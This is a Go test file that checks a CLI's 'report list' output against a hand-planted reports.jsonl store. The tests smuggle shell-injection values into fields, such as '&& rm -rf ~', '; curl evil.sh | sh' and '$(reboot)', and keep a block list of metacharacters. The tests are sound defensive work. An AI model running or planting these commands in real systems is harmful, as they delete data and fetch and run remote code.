package main

// report_render_plant_test.go — spec 094 Bead 3 RE-PANEL (rp-render #1/#2 +
// rp-codex-completeness item1): the RENDER path must fail-closed against a
// HAND-PLANTED reports.jsonl. The bead's threat model is that the STORE ITSELF
// is untrusted, so write-time normalization (the --resolve flag) is necessary
// but NOT sufficient — a value planted DIRECTLY into reports.jsonl never passes
// the flag normalizer and reaches the render path.
//
// These tests PLANT malicious values directly into reports.jsonl (NOT via the
// --resolve flag — the existing report_fix_test.go metachar test only exercises
// the flag path, which is why it missed these leaks) and assert no shell
// metacharacter or raw planted token survives in `report list` stdout.
//
// RED-before: renderField (a PII scrubber) passed unrecognized surrounding text,
// so `<64hex>; curl evil.sh | sh` rendered as `<token>; curl <file> | sh` and a
// planted `resolved_in_version="1.0.0 && rm -rf ~"` rendered verbatim.
// GREEN-after: per-field closed-form validators (renderVersion / renderEnum /
// renderFingerprint) emit the literal `<redacted>` on any mismatch.

import (
	"strings"
	"testing"

	"github.com/mrmaxsteel/mindspec/internal/journal"
)

// shellMetachars are the metacharacter sequences NO rendered field may emit for
// ANY hand-planted store. (The triple-backtick code fence is legitimate framing
// — see assertNoMetachars, which checks the DATA rows only.)
var shellMetachars = []string{";", "&", "|", "$(", "`", "rm -rf", "curl", "evil.sh"}

// assertNoMetachars fails if any shell metacharacter (or a raw planted token)
// survived into a DATA row of out. The triple-backtick code fence (```) is
// legitimate framing the spec mandates (Req 7), so the two fence lines are
// stripped before the metachar sweep; everything between them is untrusted
// rendered content and must be metachar-free.
func assertNoMetachars(t *testing.T, out string, extraBanned ...string) {
	t.Helper()
	var body strings.Builder
	for _, line := range strings.Split(out, "\n") {
		if strings.TrimSpace(line) == "```" {
			continue // the mandated code fence is not rendered field content
		}
		body.WriteString(line)
		body.WriteByte('\n')
	}
	scanned := body.String()
	for _, m := range shellMetachars {
		if strings.Contains(scanned, m) {
			t.Errorf("LEAK: shell metacharacter %q reached render output:\n%s", m, out)
		}
	}
	for _, b := range extraBanned {
		if b != "" && strings.Contains(scanned, b) {
			t.Errorf("LEAK: planted token %q reached render output:\n%s", b, out)
		}
	}
	// A forged `recovery:`-style line (newline-injected) must never appear.
	if strings.Contains(scanned, "recovery:") {
		t.Errorf("LEAK: a forged recovery: line reached render output:\n%s", out)
	}
}

// TestReportList_PlantedResolvedInVersionMetachar_FailsClosed is the rp-render
// #1 repro: a hand-crafted reports.jsonl with
// resolved_in_version="1.0.0 && rm -rf ~" must render `<redacted>` in the
// RESOLVED-IN column, never the verbatim payload.
func TestReportList_PlantedResolvedInVersionMetachar_FailsClosed(t *testing.T) {
	dir := t.TempDir()
	t.Setenv(journal.StateDirEnv, dir)
	t.Setenv("GITHUB_ACTIONS", "")

	writeRawReports(t, dir, `{"v":1,"fingerprint":"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff","identity":{"command":"report","escape_hatch":"","subcommand":"list"},"command":"report","escape_hatch":"","subcommand":"list","count":1,"first_version":"1.0.0","first_seen_ts":"2026-01-01T00:00:00Z","last_seen_ts":"2026-01-01T00:00:00Z","last_version":"1.0.0","resolved_in_version":"1.0.0 && rm -rf ~"}`+"\n")

	out, err := execReport(t, "list")
	if err != nil {
		t.Fatalf("report list: %v", err)
	}
	assertNoMetachars(t, out)
	if !strings.Contains(out, "<redacted>") {
		t.Errorf("planted resolved_in_version must render <redacted>, got:\n%s", out)
	}
}

// TestReportList_PlantedFingerprintMetacharTail_FailsClosed is the rp-render #2
// repro: a fingerprint = <64-hex> + "; curl evil.sh | sh" (len 80, non-canonical)
// must render `<redacted>`, never a scrubbed prefix with the surviving
// shell-metachar tail.
func TestReportList_PlantedFingerprintMetacharTail_FailsClosed(t *testing.T) {
	dir := t.TempDir()
	t.Setenv(journal.StateDirEnv, dir)
	t.Setenv("GITHUB_ACTIONS", "")

	writeRawReports(t, dir, `{"v":1,"fingerprint":"2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881; curl evil.sh | sh","identity":{"command":"report","escape_hatch":"","subcommand":"list"},"command":"report","escape_hatch":"","subcommand":"list","count":1,"first_version":"1.0.0","first_seen_ts":"2026-01-01T00:00:00Z","last_seen_ts":"2026-01-01T00:00:00Z","last_version":"1.0.0"}`+"\n")

	out, err := execReport(t, "list")
	if err != nil {
		t.Fatalf("report list: %v", err)
	}
	assertNoMetachars(t, out)
	if !strings.Contains(out, "<redacted>") {
		t.Errorf("planted fingerprint-with-tail must render <redacted>, got:\n%s", out)
	}
}

// TestReportList_PlantedEveryFieldMetachar_FailsClosed plants a shell-metachar
// or out-of-enum payload into EVERY rendered field at once and asserts NONE
// survives — the comprehensive store-planting sweep the flag-path test missed.
func TestReportList_PlantedEveryFieldMetachar_FailsClosed(t *testing.T) {
	dir := t.TempDir()
	t.Setenv(journal.StateDirEnv, dir)
	t.Setenv("GITHUB_ACTIONS", "")

	// Every string field carries a distinct shell-metachar / out-of-enum payload.
	writeRawReports(t, dir, `{"v":1,`+
		`"fingerprint":"LEAKfp $(reboot)",`+
		`"command":"report; rm -rf ~",`+
		`"escape_hatch":"override-adr && curl evil.sh",`+
		`"subcommand":"list | sh",`+
		`"count":1,`+
		`"first_version":"1.0.0; rm -rf /",`+
		`"first_seen_ts":"2026-01-01T00:00:00Z",`+
		`"last_seen_ts":"2026-01-01T00:00:00Z",`+
		`"last_version":"$(whoami)",`+
		`"resolved_in_version":"`+"`id`"+`"}`+"\n")

	out, err := execReport(t, "list")
	if err != nil {
		t.Fatalf("report list: %v", err)
	}
	// No metachar, and none of the distinctive planted tokens, may survive.
	assertNoMetachars(t, out, "LEAKfp", "reboot", "whoami", "override-adr &&")
	if !strings.Contains(out, "<redacted>") {
		t.Errorf("planted fields must fail closed to <redacted>, got:\n%s", out)
	}
}

// TestReportList_LegitimateValuesRenderVerbatim guards against over-redaction:
// a genuine 64-hex fingerprint, valid enum tokens, and bare semver / dev
// versions must STILL render verbatim (so --resolve copy-paste keeps working).
func TestReportList_LegitimateValuesRenderVerbatim(t *testing.T) {
	dir := t.TempDir()
	t.Setenv(journal.StateDirEnv, dir)
	t.Setenv("GITHUB_ACTIONS", "")

	const fp = "2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881"
	writeRawReports(t, dir, `{"v":1,"fingerprint":"`+fp+`","command":"complete","escape_hatch":"override-adr","subcommand":"","count":2,"first_version":"1.0.0","last_version":"2.3.4","resolved_in_version":"2.0.0"}`+"\n")

	out, err := execReport(t, "list")
	if err != nil {
		t.Fatalf("report list: %v", err)
	}
	for _, want := range []string{fp, "complete", "override-adr", "1.0.0", "2.3.4", "2.0.0"} {
		if !strings.Contains(out, want) {
			t.Errorf("legitimate value %q must render verbatim, got:\n%s", want, out)
		}
	}
	if strings.Contains(out, "<redacted>") {
		t.Errorf("legitimate row must NOT be redacted, got:\n%s", out)
	}
}
